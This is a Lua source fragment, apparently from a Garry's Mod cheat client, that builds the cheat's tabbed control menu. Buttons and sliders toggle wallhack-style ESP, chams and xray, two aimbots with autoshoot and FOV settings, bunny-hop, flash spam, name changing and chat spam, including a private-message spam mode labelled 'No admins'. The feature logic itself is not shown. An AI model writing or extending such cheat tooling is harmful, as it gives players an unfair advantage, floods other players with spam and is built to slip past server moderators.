local panel1 = vgui.Create( "DPanel", sheet )
panel1.Paint = function( self, w, h ) draw.RoundedBox( 4, 0, 0, w, h, Color( 30, 30, 30 ) ) end
sheet:AddSheet( "Visuals", panel1, "icon16/eye.png" )


local esppanel = vgui.Create( "DPanel", panel1 )
esppanel:SetPos( 15, 50 )
esppanel:SetSize( 250, 280 )
esppanel.Paint = function() 
    surface.SetDrawColor(60, 60, 60, 255 ) 
    surface.DrawRect( 0, 0, esppanel:GetWide(), esppanel:GetTall() ) 
end
 
 
local Button = vgui.Create( "DButton", esppanel )

Button:SetFont ("menufont2")
Button:SetTextColor( Color( 255, 255, 255 ) )
Button:SetPos( 75, 20 )
Button:SetSize( 100, 30 )
Button.Paint = function( self, w, h )

if GetConVarNumber ("hl_esp") == 1 then 
	draw.RoundedBox( 5, 0, 0, w, h, Color( 255,140,0 ,255 ) ) 
	Button:SetText( "Esp Enabled" )
end 
if GetConVarNumber ("hl_esp") ==  0  then 
	draw.RoundedBox( 5, 0, 0, w, h, Color( 255,0,0 ,255 ) ) 
	Button:SetText( "Esp Disabled" )
end 

end
Button.DoClick = function()
	flipconvar ("hl_esp")
end


 
 local Button = vgui.Create( "DButton", esppanel )

Button:SetFont ("menufont2")
Button:SetTextColor( Color( 255, 255, 255 ) )
Button:SetPos( 20, 60 )
Button:SetSize( 100, 30 )
Button.Paint = function( self, w, h )
	draw.RoundedBox( 5, 0, 0, w, h, Color( 255,140,0 ,255 ) ) 
	Button:SetText( "Esp Font" )
end
Button.DoClick = function()
 local MenuButtonOptions = DermaMenu() 
    MenuButtonOptions:AddOption("Font 1", function() LocalPlayer():ConCommand ("hl_esp_font font1") end )  
    MenuButtonOptions:AddOption("Font 2", function() LocalPlayer():ConCommand ("hl_esp_font font2") end ) 
    MenuButtonOptions:AddOption("Font 3", function() LocalPlayer():ConCommand ("hl_esp_font font3") end ) 
    MenuButtonOptions:AddOption("Font 4", function() LocalPlayer():ConCommand ("hl_esp_font font4") end ) 
    MenuButtonOptions:AddOption("Font 5", function() LocalPlayer():ConCommand ("hl_esp_font font5") end ) 
    MenuButtonOptions:Open() 
end






local Button = vgui.Create( "DButton", esppanel )

Button:SetFont ("menufont2")
Button:SetTextColor( Color( 255, 255, 255 ) )
Button:SetPos( 130, 60 )
Button:SetSize( 100, 30 )
Button.Paint = function( self, w, h )

if GetConVarNumber ("hl_esp_box") == 1 then 
	draw.RoundedBox( 5, 0, 0, w, h, Color( 255,140,0 ,255 ) ) 
	Button:SetText( "Esp Box On" )
end 
if GetConVarNumber ("hl_esp_box") ==  0  then 
	draw.RoundedBox( 5, 0, 0, w, h, Color( 255,0,0 ,255 ) ) 
	Button:SetText( "Esp Box Off" )
end 

end
Button.DoClick = function()
	flipconvar ("hl_esp_box")
end


 

local color = vgui.Create( "DColorMixer",esppanel);
color:SetSize( 60, 100);
color:SetPos( 40, 160 );
color:SetPalette( false ) 	
color:SetWangs( false ) 	
color:SetAlphaBar( false ) 	
color:SetColor(Color(GetConVarNumber ("hl_esp_r") ,GetConVarNumber ("hl_esp_g"),GetConVarNumber ("hl_esp_b"),255))

function color:ValueChanged( color)
	LocalPlayer():ConCommand ("hl_esp_r "..color.r)
	LocalPlayer():ConCommand ("hl_esp_g "..color.g)
	LocalPlayer():ConCommand("hl_esp_b "..color.b)
end



 

local color2 = vgui.Create( "DColorMixer",esppanel);
color2:SetSize( 60, 100);
color2:SetPos( 160, 160 );
color2:SetPalette( false ) 	
color2:SetWangs( false ) 	
color2:SetAlphaBar( false ) 	
color2:SetColor(Color(GetConVarNumber ("hl_esp_out_r") ,GetConVarNumber ("hl_esp_out_g"),GetConVarNumber ("hl_esp_out_b"),255))

function color2:ValueChanged( color)
	LocalPlayer():ConCommand ("hl_esp_out_r "..color.r)
	LocalPlayer():ConCommand ("hl_esp_out_g "..color.g)
	LocalPlayer():ConCommand("hl_esp_out_b "..color.b)
end
  
 local espcolor = vgui.Create( "DLabel", esppanel )
espcolor:SetPos(84, 100 )
espcolor:SetSize (100)
espcolor:SetFont ("menufont2")
espcolor:SizeToContents() 
espcolor:SetSize(Frame:GetWide(), 30)
espcolor:SetText ("ESP Colors")


  local espcolor = vgui.Create( "DLabel", esppanel )
espcolor:SetPos(50, 130 )
espcolor:SetSize (100)
espcolor:SetFont ("menufont2")
espcolor:SizeToContents() 
espcolor:SetSize(Frame:GetWide(), 30)
espcolor:SetText ("ESP")


   local espcolor = vgui.Create( "DLabel", esppanel )
espcolor:SetPos(150, 130 )
espcolor:SetSize (100)
espcolor:SetFont ("menufont2")
espcolor:SizeToContents() 
espcolor:SetSize(Frame:GetWide(), 30)
espcolor:SetText ("Outline")


 
 
 
 local esptitle = vgui.Create( "DLabel", panel1 )
esptitle:SetPos(110, 10 )
esptitle:SetSize (100)
esptitle:SetFont ("menufont1")
esptitle:SizeToContents() 
esptitle:SetSize(Frame:GetWide(), 30)
esptitle:SetText ("ESP")






  local esptitle2 = vgui.Create( "DLabel", panel1 )
esptitle2:SetPos(360, 10 )
esptitle2:SetSize (100)
esptitle2:SetFont ("menufont1")
esptitle2:SizeToContents() 
esptitle2:SetSize(Frame:GetWide(), 30)
esptitle2:SetText ("Chams")

   local esptitle3 = vgui.Create( "DLabel", panel1 )
esptitle3:SetPos(620, 10 )
esptitle3:SetSize (100)
esptitle3:SetFont ("menufont1")
esptitle3:SizeToContents() 
esptitle3:SetSize(Frame:GetWide(), 30)
esptitle3:SetText ("Xray")

 
local esppanel2 = vgui.Create( "DPanel", panel1 )
esppanel2:SetPos( 275, 50 )
esppanel2:SetSize( 250, 280 )
esppanel2.Paint = function() 
    surface.SetDrawColor(60, 60, 60, 255 ) 
    surface.DrawRect( 0, 0, esppanel:GetWide(), esppanel:GetTall() ) 
end
 
 
 
 
local Button = vgui.Create( "DButton", esppanel2 )

Button:SetFont ("menufont2")
Button:SetTextColor( Color( 255, 255, 255 ) )
Button:SetPos( 75, 20 )
Button:SetSize( 100, 30 )
Button.Paint = function( self, w, h )
	if GetConVarNumber ("hl_chams") == 1 then 
	draw.RoundedBox( 5, 0, 0, w, h, Color( 255,140,0 ,255 ) ) 
	Button:SetText( "Chams ON" )
end 
	if GetConVarNumber ("hl_chams") == 0 then 
	draw.RoundedBox( 5, 0, 0, w, h, Color( 255,0,0 ,255 ) ) 
	Button:SetText( "Chams OFF" )
	
end 

end
Button.DoClick = function()
	flipconvar ("hl_chams")
end


 

local colorc = vgui.Create( "DColorMixer",esppanel2);
colorc:SetSize( 60, 100);
colorc:SetPos( 40, 160 );
colorc:SetPalette( false ) 	
colorc:SetWangs( false ) 	
colorc:SetAlphaBar( false ) 	
colorc:SetColor(Color(GetConVarNumber ("hl_chams_r") ,GetConVarNumber ("hl_chams_g"),GetConVarNumber ("hl_chams_b")))
function colorc:ValueChanged(color)
	LocalPlayer():ConCommand ("hl_chams_r "..color.r)
	LocalPlayer():ConCommand("hl_chams_g "..color.g)
	LocalPlayer():ConCommand("hl_chams_b "..color.b)
end

 


 
  
 local chamscolor = vgui.Create( "DLabel", esppanel2 )
chamscolor:SetPos(84, 100 )
chamscolor:SetSize (100)
chamscolor:SetFont ("menufont2")
chamscolor:SizeToContents() 
chamscolor:SetSize(Frame:GetWide(), 30)
chamscolor:SetText ("Cham Colors")


  local chamscolor = vgui.Create( "DLabel", esppanel2 )
chamscolor:SetPos(50, 130 )
chamscolor:SetSize (100)
chamscolor:SetFont ("menufont2")
chamscolor:SizeToContents() 
chamscolor:SetSize(Frame:GetWide(), 30)
chamscolor:SetText ("Chams")


   local chamscolor = vgui.Create( "DLabel", esppanel2 )
chamscolor:SetPos(150, 130 )
chamscolor:SetSize (100)
chamscolor:SetFont ("menufont2")
chamscolor:SizeToContents() 
chamscolor:SetSize(Frame:GetWide(), 30)
chamscolor:SetText ("Opacity")


 local DAlphaBar = vgui.Create( "DAlphaBar" ,esppanel2)
DAlphaBar:SetSize( 25, 100 )
DAlphaBar:SetValue( 0.25 )
DAlphaBar:SetPos( 165, 160 );
DAlphaBar:SetValue( 0.25 )
DAlphaBar.OnChange = function( val )
	LocalPlayer():ConCommand("hl_chams_transparancy ".. DAlphaBar:GetValue())
end
 
 
 
 

local esppanel3 = vgui.Create( "DPanel", panel1 )
esppanel3:SetPos( 535, 50 )
esppanel3:SetSize( 250, 280 )
esppanel3.Paint = function() 
    surface.SetDrawColor(60, 60, 60, 255 ) 
    surface.DrawRect( 0, 0, esppanel:GetWide(), esppanel:GetTall() ) 
end
 


 
 
 
local Button = vgui.Create( "DButton", esppanel3 )

Button:SetFont ("menufont2")
Button:SetTextColor( Color( 255, 255, 255 ) )
Button:SetPos( 75, 20 )
Button:SetSize( 100, 30 )
Button.Paint = function( self, w, h )
	if GetConVarNumber ("hl_xray") == 1 then 
	draw.RoundedBox( 5, 0, 0, w, h, Color( 255,140,0 ,255 ) ) 
	Button:SetText( "Xray Off" )
end 
	if GetConVarNumber ("hl_xray") == 0 then 
	draw.RoundedBox( 5, 0, 0, w, h, Color( 255,0,0 ,255 ) ) 
	Button:SetText( "Xray On" )
	
end 

end
Button.DoClick = function()
	flipconvar ("hl_xray")
end


local Button = vgui.Create( "DButton", esppanel3 )

Button:SetFont ("menufont2")
Button:SetTextColor( Color( 255, 255, 255 ) )
Button:SetPos( 75, 60 )
Button:SetSize( 110, 30 )
Button.Paint = function( self, w, h )
	if GetConVarNumber ("hl_headbeam") == 1 then 
	draw.RoundedBox( 5, 0, 0, w, h, Color( 255,140,0 ,255 ) ) 
	Button:SetText( "Headbeam On" )
end 
	if GetConVarNumber ("hl_headbeam") == 0 then 
	draw.RoundedBox( 5, 0, 0, w, h, Color( 255,0,0 ,255 ) ) 
	Button:SetText( "Headbeam Off" )
	
end 

end
Button.DoClick = function()
	flipconvar ("hl_headbeam")
end






 

local colorx = vgui.Create( "DColorMixer",esppanel3);
colorx:SetSize( 60, 100);
colorx:SetPos( 40, 160 );
colorx:SetPalette( false ) 	
colorx:SetWangs( false ) 	
colorx:SetAlphaBar( false ) 	
colorx:SetColor(Color(GetConVarNumber ("hl_xray_r") ,GetConVarNumber ("hl_xray_g"),GetConVarNumber ("hl_xray_b"),255))

 function colorx:ValueChanged(color)
	LocalPlayer():ConCommand("hl_xray_r "..color.r)
	LocalPlayer():ConCommand("hl_xray_g "..color.g)
	LocalPlayer():ConCommand("hl_xray_b "..color.b)
end


 
  
 local xraycolor = vgui.Create( "DLabel", esppanel3 )
xraycolor:SetPos(84, 100 )
xraycolor:SetSize (100)
xraycolor:SetFont ("menufont2")
xraycolor:SizeToContents() 
xraycolor:SetSize(Frame:GetWide(), 30)
xraycolor:SetText ("Xray Colors")


  local xraycolor = vgui.Create( "DLabel", esppanel3 )
xraycolor:SetPos(50, 130 )
xraycolor:SetSize (100)
xraycolor:SetFont ("menufont2")
xraycolor:SizeToContents() 
xraycolor:SetSize(Frame:GetWide(), 30)
xraycolor:SetText ("Xray")


   local xraycolor = vgui.Create( "DLabel", esppanel3 )
xraycolor:SetPos(150, 130 )
xraycolor:SetSize (100)
xraycolor:SetFont ("menufont2")
xraycolor:SizeToContents() 
xraycolor:SetSize(Frame:GetWide(), 30)
xraycolor:SetText ("Opacity")


 local DAlphaBar = vgui.Create( "DAlphaBar" ,esppanel3)
DAlphaBar:SetSize( 25, 100 )
DAlphaBar:SetValue( 0.25 )
DAlphaBar:SetPos( 165, 160 );
DAlphaBar:SetValue( 0.25 )
DAlphaBar.OnChange = function( val )
	LocalPlayer():ConCommand ("hl_xray_transparancy " ..DAlphaBar:GetValue())
end
 


 
 
 

local panel2 = vgui.Create( "DPanel", sheet )
panel2.Paint = function( self, w, h ) draw.RoundedBox( 4, 0, 0, w, h, Color( 30, 30, 30 ) ) end
sheet:AddSheet( "Aim", panel2, "icon16/arrow_in.png" )

local lpanel5 = vgui.Create( "DPanel",panel2 )
lpanel5:SetPos( 20, 50 )
lpanel5:SetSize( 300, 240 )
lpanel5.Paint = function() 
    surface.SetDrawColor(60, 60, 60, 255 ) 
    surface.DrawRect( 0, 0, lpanel5:GetWide(), lpanel5 :GetTall() ) 
end

/*
CreateClientConVar("hl_aimbot", "0", false, false)
CreateClientConVar("hl_aimbot_ignore_friends", "0", false, false)
CreateClientConVar("hl_aimbot_ignore_buddies", "0", false, false)
CreateClientConVar("hl_aimbot_ignore_team", "0", false, false)


*/
  local aimbol = vgui.Create( "DLabel", panel2 )
aimbol:SetPos(80, 20 )
aimbol:SetSize (100)
aimbol:SetFont ("menufont1")
aimbol:SizeToContents() 
aimbol:SetSize(Frame:GetWide(), 30)
aimbol:SetText ("Aimbot (Old)")



local Button = vgui.Create( "DButton", lpanel5)

Button:SetFont ("menufont2")
Button:SetTextColor( Color( 255, 255, 255 ) )
Button:SetPos( 40, 20 )
Button:SetSize( 120, 30 )
Button.Paint = function( self, w, h )
	if GetConVarNumber ("hl_aimbot") == 1 then 
	draw.RoundedBox( 5, 0, 0, w, h, Color( 255,140,0 ,255 ) ) 
	Button:SetText( "Aimbot ON" )
end 
	if GetConVarNumber ("hl_aimbot") == 0 then 
	draw.RoundedBox( 5, 0, 0, w, h, Color( 255,0,0 ,255 ) ) 
	Button:SetText( "Aimbot OFF" )
	
end 

end
Button.DoClick = function()
	flipconvar ("hl_aimbot")
	
		if GetConVarNumber ("hl_aimbot") == 1 then 
		hlchat ("Aimbot enabled! Hold E to use!", "t")
		LocalPlayer():ConCommand ("hl_aimbot_legit 0")
	end 
	
end





local Button = vgui.Create( "DButton", lpanel5)

Button:SetFont ("menufont2")
Button:SetTextColor( Color( 255, 255, 255 ) )
Button:SetPos( 40, 60 )
Button:SetSize( 120, 30 )
Button.Paint = function( self, w, h )
if GetConVarNumber ("hl_aimbot_ignore_friends") == 1 then 
	draw.RoundedBox( 5, 0, 0, w, h, Color( 255,140,0 ,255 ) ) 
	Button:SetText( "Ignore friends" )
end 
if GetConVarNumber ("hl_aimbot_ignore_friends") == 0 then 
	draw.RoundedBox( 5, 0, 0, w, h, Color( 255,0,0 ,255 ) ) 
	Button:SetText( "Target friends" )
end 

end
Button.DoClick = function()
flipconvar("hl_aimbot_ignore_friends")
end




local Button = vgui.Create( "DButton", lpanel5)

Button:SetFont ("menufont2")
Button:SetTextColor( Color( 255, 255, 255 ) )
Button:SetPos( 40, 100 )
Button:SetSize( 120, 30 )
Button.Paint = function( self, w, h )
if GetConVarNumber ("hl_aimbot_ignore_buddies") == 1 then 
	draw.RoundedBox( 5, 0, 0, w, h, Color( 255,140,0 ,255 ) ) 
	Button:SetText( "Ignore Buddies" )
end 
if GetConVarNumber ("hl_aimbot_ignore_buddies") == 0 then 
	draw.RoundedBox( 5, 0, 0, w, h, Color( 255,0,0 ,255 ) ) 
	Button:SetText( "Target Buddies" )
end 

end
Button.DoClick = function()
	flipconvar ("hl_aimbot_ignore_buddies")
end




local Button = vgui.Create( "DButton", lpanel5)

Button:SetFont ("menufont2")
Button:SetTextColor( Color( 255, 255, 255 ) )
Button:SetPos( 40, 140 )
Button:SetSize( 120, 30 )
Button.Paint = function( self, w, h )
if GetConVarNumber ("hl_aimbot_ignore_team") == 1 then 
	draw.RoundedBox( 5, 0, 0, w, h, Color( 255,140,0 ,255 ) ) 
	Button:SetText( "Ignore Team" )
end 
if GetConVarNumber ("hl_aimbot_ignore_team") == 0 then 
	draw.RoundedBox( 5, 0, 0, w, h, Color( 255,0,0 ,255 ) ) 
	Button:SetText( "Target Team" )
end 

end
Button.DoClick = function()
	flipconvar  ("hl_aimbot_ignore_team")
end




 local lpanel59 = vgui.Create( "DPanel",panel2 )
lpanel59:SetPos(380, 50 )
lpanel59:SetSize( 300, 240 )
lpanel59.Paint = function() 
    surface.SetDrawColor(60, 60, 60, 255 ) 
    surface.DrawRect( 0, 0, lpanel59:GetWide(), lpanel59 :GetTall() ) 
end


  local aimbol = vgui.Create( "DLabel", panel2 )
aimbol:SetPos(400, 20 )
aimbol:SetSize (100)
aimbol:SetFont ("menufont1")
aimbol:SizeToContents() 
aimbol:SetSize(Frame:GetWide(), 30)
aimbol:SetText ("Aimbot (New) (BETA)")



local Button = vgui.Create( "DButton", lpanel59)

Button:SetFont ("menufont2")
Button:SetTextColor( Color( 255, 255, 255 ) )
Button:SetPos( 40, 20 )
Button:SetSize( 120, 30 )
Button.Paint = function( self, w, h )
if GetConVarNumber ("hl_aimbot_legit") == 1 then 
	draw.RoundedBox( 5, 0, 0, w, h, Color( 255,140,0 ,255 ) ) 
	Button:SetText( "Aimbot On" )
end 
if GetConVarNumber ("hl_aimbot_legit") == 0 then 
	draw.RoundedBox( 5, 0, 0, w, h, Color( 255,0,0 ,255 ) ) 
	Button:SetText( "Aimbot Off" )
end 

end
Button.DoClick = function()
	flipconvar  ("hl_aimbot_legit")
	
	
		hlchat ("Aimbot enabled! Hold E to use!", "t")
	

end












local Button = vgui.Create( "DButton", lpanel59)

Button:SetFont ("menufont2")
Button:SetTextColor( Color( 255, 255, 255 ) )
Button:SetPos( 40, 60 )
Button:SetSize( 120, 30 )
Button.Paint = function( self, w, h )
if GetConVarNumber ("hl_aimbot_legit_autoshoot") == 1 then 
	draw.RoundedBox( 5, 0, 0, w, h, Color( 255,140,0 ,255 ) ) 
	Button:SetText( "Autoshoot On" )
end 
if GetConVarNumber ("hl_aimbot_legit_autoshoot") == 0 then 
	draw.RoundedBox( 5, 0, 0, w, h, Color( 255,0,0 ,255 ) ) 
	Button:SetText( "Autoshoot Off" )
end 

end
Button.DoClick = function()
	flipconvar  ("hl_aimbot_legit_autoshoot")
end



  local aimbol = vgui.Create( "DLabel", lpanel59 )
aimbol:SetPos(50, 100)
aimbol:SetSize (10)
aimbol:SetFont ("menufont2")
aimbol:SizeToContents() 
aimbol:SetSize(Frame:GetWide(), 30)
aimbol:SetText ("Aimbot Speed")



local DermaNumSlider = vgui.Create( "DNumSlider", lpanel59)
DermaNumSlider:SetPos( -30, 130 )			
DermaNumSlider:SetSize( 190, 10 )		
DermaNumSlider:SetMin( 0 )				
DermaNumSlider:SetMax( 999)				
DermaNumSlider:SetDecimals( 0 )			
DermaNumSlider:SetConVar( "hl_aimbot_legit_speed" )

 
 
 local aimbol = vgui.Create( "DLabel", lpanel59 )
aimbol:SetPos(50, 150)
aimbol:SetSize (10)
aimbol:SetFont ("menufont2")
aimbol:SizeToContents() 
aimbol:SetSize(Frame:GetWide(), 30)
aimbol:SetText ("Aimbot FOV")




local DermaNumSlider = vgui.Create( "DNumSlider", lpanel59)
DermaNumSlider:SetPos( -30, 180 )			
DermaNumSlider:SetSize( 190, 10 )		
DermaNumSlider:SetMin( 0 )				
DermaNumSlider:SetMax( 360)				
DermaNumSlider:SetDecimals( 0 )			
DermaNumSlider:SetConVar( "hl_aimbot_legit_fov" )





local panel3 = vgui.Create( "DPanel", sheet )
panel3.Paint = function( self, w, h ) draw.RoundedBox( 4, 0, 0, w, h, Color( 30, 30, 30 ) ) end
sheet:AddSheet( "Misc", panel3, "icon16/cog.png" )


















local lpanel3 = vgui.Create( "DPanel", panel3 )
lpanel3:SetPos( 15, 50 )
lpanel3:SetSize( 250, 300 )
lpanel3.Paint = function() 
    surface.SetDrawColor(60, 60, 60, 255 ) 
    surface.DrawRect( 0, 0, lpanel3:GetWide(), lpanel3:GetTall() ) 
end


local lpanel4 = vgui.Create( "DPanel", panel3 )
lpanel4:SetPos( 275, 50 )
lpanel4:SetSize( 250, 300 )
lpanel4.Paint = function() 
    surface.SetDrawColor(60, 60, 60, 255 ) 
    surface.DrawRect( 0, 0, lpanel4:GetWide(), lpanel4:GetTall() ) 
end




local lpanel5 = vgui.Create( "DPanel", panel3 )
lpanel5:SetPos( 535, 50 )
lpanel5:SetSize( 250, 300 )
lpanel5.Paint = function() 
    surface.SetDrawColor(60, 60, 60, 255 ) 
    surface.DrawRect( 0, 0, lpanel5:GetWide(), lpanel5:GetTall() ) 
end



 
  local esptitle2 = vgui.Create( "DLabel", panel3 )
esptitle2:SetPos(360, 10 )
esptitle2:SetSize (100)
esptitle2:SetFont ("menufont1")
esptitle2:SizeToContents() 
esptitle2:SetSize(Frame:GetWide(), 30)
esptitle2:SetText ("General")



  local esptitle2 = vgui.Create( "DLabel", panel3 )
esptitle2:SetPos(620, 10 )
esptitle2:SetSize (100)
esptitle2:SetFont ("menufont1")
esptitle2:SizeToContents() 
esptitle2:SetSize(Frame:GetWide(), 30)
esptitle2:SetText ("Entity")

 local esptitle2 = vgui.Create( "DLabel", panel3 )
esptitle2:SetPos(100, 10 )
esptitle2:SetSize (100)
esptitle2:SetFont ("menufont1")
esptitle2:SizeToContents() 
esptitle2:SetSize(Frame:GetWide(), 30)
esptitle2:SetText ("Chat")












local TextEntry2 = vgui.Create( "DTextEntry",lpanel3 ) -- create the form as a child of frame
TextEntry2:SetPos( 40, 60 )
TextEntry2:SetSize( 140, 30 )
TextEntry2:SetText( "Chat Message" )
TextEntry2:SetFont( "menufont2" )
TextEntry2.OnChange = function( self )
	chat.AddText( self:GetValue() )	
	 LocalPlayer():ConCommand ("hl_chatspam_text ".. self:GetValue())
end







local Button = vgui.Create( "DButton", lpanel3)
Button:SetFont ("menufont2")
Button:SetTextColor( Color( 255, 255, 255 ) )
Button:SetPos( 40, 20 )
Button:SetSize( 140, 30 )
Button.Paint = function( self, w, h )
if GetConVarNumber ("hl_chatspam") == 1 then 
	draw.RoundedBox( 5, 0, 0, w, h, Color( 255,140,0 ,255 ) ) 
	Button:SetText( "Chatspam On" )
end 
if GetConVarNumber ("hl_chatspam") == 0 then 
	draw.RoundedBox( 5, 0, 0, w, h, Color( 255,0,0 ,255 ) ) 
	Button:SetText( "Chatspam Off" )
end 

end
Button.DoClick = function()
	flipconvar  ("hl_chatspam")
end

local Button = vgui.Create( "DButton", lpanel3 )
Button:SetFont ("menufont2")
Button:SetTextColor( Color( 255, 255, 255 ) )
Button:SetPos( 40, 100 )


Button:SetSize( 140, 30 )
Button.Paint = function( self, w, h )
	draw.RoundedBox( 5, 0, 0, w, h, Color( 255,140,0 ,255 ) ) 
	Button:SetText( "Chatspam mode" )
end
Button.DoClick = function()
 local MenuButtonOptions = DermaMenu() 
    MenuButtonOptions:AddOption("Normal spam", function() LocalPlayer():ConCommand ("hl_chatspam_mode normal") end )  
    MenuButtonOptions:AddOption("Psay Spam", function() LocalPlayer():ConCommand ("hl_chatspam_mode psay") end ) 
	 MenuButtonOptions:AddOption("Psay Spam No admins", function() LocalPlayer():ConCommand ("hl_chatspam_mode psaynoadmins") end ) 
    MenuButtonOptions:Open() 
end







local Button = vgui.Create( "DButton", lpanel3)
Button:SetFont ("menufont2")
Button:SetTextColor( Color( 255, 255, 255 ) )
Button:SetPos( 40, 140 )
Button:SetSize( 140, 30 )
Button.Paint = function( self, w, h )
if GetConVarNumber ("hl_namechanger") == 1 then 
	draw.RoundedBox( 5, 0, 0, w, h, Color( 255,140,0 ,255 ) ) 
	Button:SetText( "Namechanger On" )
end 
if GetConVarNumber ("hl_namechanger") == 0 then 
	draw.RoundedBox( 5, 0, 0, w, h, Color( 255,0,0 ,255 ) ) 
	Button:SetText( "Namechanger Off" )
end 

end
Button.DoClick = function()
	flipconvar  ("hl_namechanger")
end






local Button = vgui.Create( "DButton", lpanel3 )
Button:SetFont ("menufont2")
Button:SetTextColor( Color( 255, 255, 255 ) )
Button:SetPos( 40, 180)
Button:SetSize( 140, 30 )
Button.Paint = function( self, w, h )
	draw.RoundedBox( 5, 0, 0, w, h, Color( 255,140,0 ,255 ) ) 
	Button:SetText( "Name mode" )
end
Button.DoClick = function()
 local MenuButtonOptions = DermaMenu() 
    MenuButtonOptions:AddOption("Normal namechanger", function() LocalPlayer():ConCommand ("hl_namechanger_mode normal") end )  
    MenuButtonOptions:AddOption("Numbers namechanger", function() LocalPlayer():ConCommand ("hl_namechanger_mode numbers") end ) 
    MenuButtonOptions:Open() 
end
















local Button = vgui.Create( "DButton", lpanel4)
Button:SetFont ("menufont2")
Button:SetTextColor( Color( 255, 255, 255 ) )
Button:SetPos( 60, 20 )
Button:SetSize( 140, 30 )
Button.Paint = function( self, w, h )
if GetConVarNumber ("hl_bhop") == 1 then 
	draw.RoundedBox( 5, 0, 0, w, h, Color( 255,140,0 ,255 ) ) 
	Button:SetText( "Bhop On" )
end 
if GetConVarNumber ("hl_bhop") == 0 then 
	draw.RoundedBox( 5, 0, 0, w, h, Color( 255,0,0 ,255 ) ) 
	Button:SetText( "Bhop Off" )
end 

end
Button.DoClick = function()
	flipconvar  ("hl_bhop")
end





local Button = vgui.Create( "DButton", lpanel4)
Button:SetFont ("menufont2")
Button:SetTextColor( Color( 255, 255, 255 ) )
Button:SetPos( 60, 60 )
Button:SetSize( 140, 30 )
Button.Paint = function( self, w, h )
if GetConVarNumber ("hl_rainbowphysgun") == 1 then 
	draw.RoundedBox( 5, 0, 0, w, h, Color( 255,140,0 ,255 ) ) 
	Button:SetText( "Rainbow Phys On" )
end 
if GetConVarNumber ("hl_rainbowphysgun") == 0 then 
	draw.RoundedBox( 5, 0, 0, w, h, Color( 255,0,0 ,255 ) ) 
	Button:SetText( "Rainbow Phys Off" )
end 

end
Button.DoClick = function()
	LocalPlayer():ConCommand ("hl_rainbowphysgun_slow 0")
	flipconvar  ("hl_rainbowphysgun")
end



local Button = vgui.Create( "DButton", lpanel4)
Button:SetFont ("menufont2")
Button:SetTextColor( Color( 255, 255, 255 ) )
Button:SetPos( 60, 100 )
Button:SetSize( 140, 30 )
Button.Paint = function( self, w, h )
if GetConVarNumber ("hl_rainbowphysgun_slow") == 1 then 
	draw.RoundedBox( 5, 0, 0, w, h, Color( 255,140,0 ,255 ) ) 
	Button:SetText( "Rainbow Slow On" )
end 
if GetConVarNumber ("hl_rainbowphysgun_slow") == 0 then 
	draw.RoundedBox( 5, 0, 0, w, h, Color( 255,0,0 ,255 ) ) 
	Button:SetText( "Rainbow Slow Off" )
end 

end
Button.DoClick = function()
	LocalPlayer():ConCommand ("hl_rainbowphysgun 0")
	flipconvar  ("hl_rainbowphysgun_slow")
end




local Button = vgui.Create( "DButton", lpanel4)
Button:SetFont ("menufont2")
Button:SetTextColor( Color( 255, 255, 255 ) )
Button:SetPos( 60, 170 )
Button:SetSize( 140, 30 )
Button.Paint = function( self, w, h )
if GetConVarNumber ("hl_flashspam") == 1 then 
	draw.RoundedBox( 5, 0, 0, w, h, Color( 255,140,0 ,255 ) ) 
	Button:SetText( "Flash Spam On" )
end 
if GetConVarNumber ("hl_flashspam") == 0 then 
	draw.RoundedBox( 5, 0, 0, w, h, Color( 255,0,0 ,255 ) ) 
	Button:SetText( "Flash Spam Off" )
end 

end
Button.DoClick = function()
	flipconvar  ("hl_flashspam")
end




local Button = vgui.Create( "DButton", lpanel4)
Button:SetFont ("menufont2")
Button:SetTextColor( Color( 255, 255, 255 ) )
Button:SetPos( 60, 210 )
Button:SetSize( 140, 30 )
Button.Paint = function( self, w, h )
if GetConVarNumber ("hl_netchat") == 1 then 
	draw.RoundedBox( 5, 0, 0, w, h, Color( 255,140,0 ,255 ) ) 
	Button:SetText( "Net Chat On" )
end 
if GetConVarNumber ("hl_netchat") == 0 then 
	draw.RoundedBox( 5, 0, 0, w, h, Color( 255,0,0 ,255 ) ) 
	Button:SetText( "Net Chat Off" )
end 

end
Button.DoClick = function()
	flipconvar  ("hl_netchat")
end





local Button = vgui.Create( "DButton", lpanel4)
Button:SetFont ("menufont2")
Button:SetTextColor( Color( 255, 255, 255 ) )
Button:SetPos( 60, 250 )
Button:SetSize( 140, 30 )
Button.Paint = function( self, w, h )
if GetConVarNumber ("hl_hud") == 1 then 
	draw.RoundedBox( 5, 0, 0, w, h, Color( 255,140,0 ,255 ) ) 
	Button:SetText( "HUD On" )
end 
if GetConVarNumber ("hl_hud") == 0 then 
	draw.RoundedBox( 5, 0, 0, w, h, Color( 255,0,0 ,255 ) ) 
	Button:SetText( "HUD Off" )
end 

end
Button.DoClick = function()
	flipconvar  ("hl_hud")
end






local DermaNumSlider = vgui.Create( "DNumSlider", lpanel4 )
DermaNumSlider:SetPos( 0, 140 )			
DermaNumSlider:SetSize( 200, 10 )		
DermaNumSlider:SetMin( 0 )				
DermaNumSlider:SetMax( 5 )				
DermaNumSlider:SetDecimals( 2 )			
DermaNumSlider:SetConVar( "hl_rainbowphysgun_slow_rate" )







local Button = vgui.Create( "DButton", lpanel5)
Button:SetFont ("menufont2")
Button:SetTextColor( Color( 255, 255, 255 ) )
Button:SetPos( 140, 220 )
Button:SetSize( 95, 30 )
Button.Paint = function( self, w, h )
if GetConVarNumber ("hl_entity_esp") == 1 then 
	draw.RoundedBox( 5, 0, 0, w, h, Color( 255,140,0 ,255 ) ) 
	Button:SetText( "Ent ESP On" )
end 
if GetConVarNumber ("hl_entity_esp") == 0 then 
	draw.RoundedBox( 5, 0, 0, w, h, Color( 255,0,0 ,255 ) ) 
	Button:SetText( "Ent ESP Off" )
end 

end
Button.DoClick = function()
	flipconvar  ("hl_entity_esp")
end








  local esptitle2 = vgui.Create( "DLabel", lpanel3 )
esptitle2:SetPos(300, 20 )
esptitle2:SetSize (100)
esptitle2:SetFont ("menufont2")
esptitle2:SizeToContents() 
esptitle2:SetSize(Frame:GetWide(), 30)
esptitle2:SetText ("Entity ESP")

 

local DermaListView = vgui.Create("DListView",lpanel5)
DermaListView:SetPos(10, 10)
DermaListView:SetSize(230, 100)
DermaListView:SetMultiSelect(true)
DermaListView:AddColumn("Entity ESP Table") 

for k,v in pairs(entity_table) do
    DermaListView:AddLine(v)
end
 
DermaListView.OnRowSelected = function( lst, index, DermaListView )
	// print( "Selected " .. DermaListView:GetColumnText( 1 ) .. " ( " .. DermaListView:GetColumnText( 2 ) .. " ) at index " .. index )
	entrm = DermaListView:GetColumnText( 1 )
end






